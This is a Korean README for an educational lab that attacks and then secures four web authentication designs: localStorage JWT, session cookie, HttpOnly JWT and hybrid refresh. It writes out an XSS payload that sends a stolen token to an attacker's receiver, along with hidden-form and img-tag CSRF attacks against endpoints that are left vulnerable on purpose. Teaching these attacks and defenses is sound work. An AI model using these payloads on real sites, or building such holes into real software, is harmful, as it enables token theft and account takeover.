# Auth-Lab: 실전 인증 해킹 & 방어 실습 환경

> **학습 목적 전용** — JWT, Session, Cookie 기반 인증의 취약점을 직접 공격하고 방어합니다.

---

## 이 디렉토리에서 하는 일

현대 웹 개발에서 가장 많이 쓰이는 **Next.js + NestJS** 스택으로 실제 서비스와 동일한 인증 환경을 구축합니다. 4가지 인증 방식을 단계별로 구현하고, 각 방식의 취약점을 **직접 공격**한 뒤 **방어**까지 완성합니다.

---

## 전체 구조

```
auth-lab/
├── README.md          ← 이 파일 (목표 및 개요)
├── plan.md            ← 구현 계획 (단계별 작업 목록)
│
├── client/            ← Next.js 14 (App Router)
├── server/            ← NestJS + PostgreSQL (Docker)
└── hacker/            ← 공격용 정적 페이지 (순수 HTML)
```

---

## 4단계 시나리오 개요

### 1단계 — JWT + LocalStorage
> "귀찮은데 그냥 로컬스토리지에 저장하자!"

| 항목 | 내용 |
|------|------|
| **저장 위치** | `localStorage.setItem('at', token)` |
| **취약점** | JavaScript로 직접 읽기 가능 → XSS 한 방에 토큰 탈취 |
| **공격 시나리오** | 게시판 XSS → `localStorage.getItem('at')` → hacker 서버로 전송 |
| **결말** | 해커가 피해자의 100만 포인트를 자기 계정으로 전액 이체 |
| **테스트 API** | `POST /api/points/transfer` |

```
공격 흐름:
피해자가 XSS 게시글 조회
  → <script>fetch('http://localhost:4999/steal?t=' + localStorage.getItem('at'))</script> 실행
  → hacker 서버 로그에 피해자 JWT 기록
  → 해커가 토큰 주입 후 포인트 전송 API 호출
  → 피해자 잔액 0원
```

---

### 2단계 — Session Cookie
> "로컬스토리지 안 써! 세션 쿠키로 간다!"

| 항목 | 내용 |
|------|------|
| **저장 위치** | 서버 세션 (`express-session`), 브라우저에는 `HttpOnly` 쿠키 |
| **취약점** | 쿠키를 JS로 못 읽어도, **브라우저가 자동으로** 다른 사이트 요청에 첨부 |
| **공격 시나리오** | 해커의 낚시 페이지에서 숨겨진 `<form>`이 자동 제출 → 세션 쿠키 자동 첨부 |
| **결말** | 피해자 비밀번호가 `hacker1234!`로 변경 → 다음날 로그인 불가 → 계정 탈취 |
| **테스트 API** | `POST /api/user/update-password` (기존 비밀번호 확인 없음) |

```
공격 흐름:
피해자가 로그인된 상태에서 해커의 낚시 사이트 접속
  → 숨겨진 form이 /api/user/update-password 로 자동 POST
  → 브라우저가 세션 쿠키 자동 첨부
  → 서버: 정상 인증된 요청으로 판단
  → 비밀번호 변경 완료
```

---

### 3단계 — JWT + HttpOnly Cookie
> "JWT를 HttpOnly 쿠키에 넣으면 XSS도 막고 완벽하겠지?"

| 항목 | 내용 |
|------|------|
| **저장 위치** | `HttpOnly` 쿠키 (`res.cookie('at', jwt, { httpOnly: true, sameSite: 'lax' })`) |
| **취약점** | `SameSite=Lax`는 외부 사이트의 **GET 요청은 허용** |
| **공격 시나리오** | 게시판의 `<img src="http://localhost:4000/api/user/withdraw">` → 이미지 로딩 시 GET 요청 → 계정 삭제 |
| **결말** | 피해자가 게시글 목록만 봤는데 계정이 영구 삭제됨 |
| **테스트 API** | `GET /api/user/withdraw` (취약한 설계: 삭제를 GET으로) |

```
공격 흐름:
공격자가 게시판에 <img src="http://localhost:4002/api/user/withdraw" style="display:none"> 삽입
  → 피해자가 게시글 목록 스크롤 (클릭조차 안 함)
  → 브라우저가 이미지 로딩 시도 → GET 요청 + HttpOnly 쿠키 자동 첨부
  → SameSite=Lax: 같은 사이트 내 요청이므로 쿠키 전송 허용
  → 서버: 인증된 탈퇴 요청으로 판단 → isWithdrawn = true
```

---

### 4단계 — Hybrid Refresh (Secure)
> "Access Token은 메모리에, Refresh Token은 HttpOnly + SameSite=Strict 쿠키에"

| 항목 | 내용 |
|------|------|
| **저장 위치** | Access Token → Zustand 메모리 / Refresh Token → `HttpOnly + Strict` 쿠키 |
| **XSS 방어** | 메모리에만 존재 → 스크립트로 읽을 수 없음, 페이지 이동 시 초기화 |
| **CSRF 방어** | API 호출 시 `Authorization: Bearer {at}` 헤더 필수 → 외부 폼/이미지로 주입 불가 |
| **Refresh 보안** | `SameSite=Strict` → 외부 사이트에서 `/refresh` 호출 시 쿠키 미전송 |
| **결말** | 공격자가 모든 공격을 시도해도 401 Unauthorized |

```
공격 시도 및 실패:
XSS: localStorage 비어있음, 메모리 변수는 접근 불가 → 실패
CSRF: Authorization 헤더 필요 → 외부 폼은 헤더 삽입 불가 → 401
Refresh 탈취 시도: SameSite=Strict → 외부 요청에 쿠키 미전송 → 실패
```

---

## 인증 방식별 비교 표

| | LocalStorage | Session Cookie | HttpOnly JWT | Hybrid Refresh |
|--|--|--|--|--|
| **XSS에 토큰 탈취** | ❌ 취약 | ✅ 안전 | ✅ 안전 | ✅ 안전 |
| **CSRF 공격** | ✅ 안전* | ❌ 취약 | ⚠️ 부분 취약 | ✅ 안전 |
| **서버 부하** | 낮음 | 높음 (세션 DB) | 낮음 | 낮음 |
| **토큰 무효화** | ❌ 어려움 | ✅ 즉시 가능 | ❌ 어려움 | ⚠️ Refresh로 가능 |
| **실무 권장** | ❌ | ⚠️ 구형 | ⚠️ 설정 중요 | ✅ |

> *LocalStorage는 CSRF에 직접 취약하진 않지만 XSS로 토큰 탈취 후 API 직접 호출 가능

---

## 공격 도구 구조 (`hacker/`)

```
hacker/
├── xss-receiver.js          ← 탈취된 토큰을 수신하는 로그 서버 (Node.js, port 4999)
├── csrf-stage2.html         ← 2단계: 세션 기반 비밀번호 변경 공격 폼
├── csrf-stage3.html         ← 3단계: img 태그를 이용한 GET CSRF 공격
└── README.md                ← 각 공격 도구 사용법
```

---

## DB 스키마

### User 테이블
| 컬럼 | 타입 | 설명 |
|------|------|------|
| `id` | UUID | PK |
| `email` | String (Unique) | 로그인 ID |
| `password` | String | bcrypt 해시 |
| `points` | Int | 보유 포인트 (기본값: 0) |
| `role` | Enum(USER/ADMIN) | 권한 |
| `isWithdrawn` | Boolean | 탈퇴 여부 (3단계 공격 대상) |

### Post 테이블
| 컬럼 | 타입 | 설명 |
|------|------|------|
| `id` | Int | PK |
| `title` | String | 게시글 제목 |
| `content` | Text | **XSS 스크립트 삽입 위치** |
| `authorId` | UUID | User FK |

### Seed Data
| 계정 | 이메일 | 비밀번호 | 포인트 | 역할 |
|------|--------|---------|--------|------|
| 피해자 | `victim@test.com` | `victim1234` | 1,000,000 | USER |
| 공격자 | `hacker@test.com` | `hacker1234` | 0 | USER |
| 관리자 | `admin@test.com` | `admin1234` | 0 | ADMIN |

---

## NestJS API 엔드포인트 목록

| Method | Path | 설명 | 단계 |
|--------|------|------|------|
| POST | `/auth/v1/login` | JWT → Body 응답 | 1 |
| POST | `/auth/v2/login` | 세션 쿠키 발급 | 2 |
| POST | `/auth/v3/login` | JWT → HttpOnly 쿠키 | 3 |
| POST | `/auth/v4/login` | AT Body + RT HttpOnly 쿠키 | 4 |
| POST | `/auth/v4/refresh` | RT 쿠키로 AT 재발급 | 4 |
| POST | `/auth/v4/logout` | RT 쿠키 삭제 | 4 |
| POST | `/api/points/transfer` | 포인트 송금 (1단계 공격 대상) | 1 |
| POST | `/api/user/update-password` | 비밀번호 변경 — oldPw 확인 없음 (2단계 공격 대상) | 2 |
| GET  | `/api/user/withdraw` | 회원 탈퇴 — GET 방식 취약 설계 (3단계 공격 대상) | 3 |
| GET  | `/api/posts` | 게시글 목록 (XSS 게시글 포함) | 1,3 |
| GET  | `/log` | 토큰 수신 로그 (hacker 서버) | 1 |

---

## 포트 구성

| 서비스 | 포트 | 설명 |
|--------|------|------|
| Next.js Client | 3000 | 피해자가 사용하는 프론트엔드 |
| NestJS Server v1 (JWT/LocalStorage) | 4001 | 1단계 서버 |
| NestJS Server v2 (Session) | 4002 | 2단계 서버 |
| NestJS Server v3 (HttpOnly JWT) | 4003 | 3단계 서버 |
| NestJS Server v4 (Hybrid Refresh) | 4004 | 4단계 서버 |
| PostgreSQL (Docker) | 5432 | DB |
| Hacker XSS Receiver | 4999 | 토큰 수신 로그 서버 |
| Hacker CSRF Page | 5000 | 공격용 낚시 페이지 |

> **중요**: 서버를 포트별로 분리해야 CORS/SameSite 동작 차이를 직접 체험할 수 있습니다.
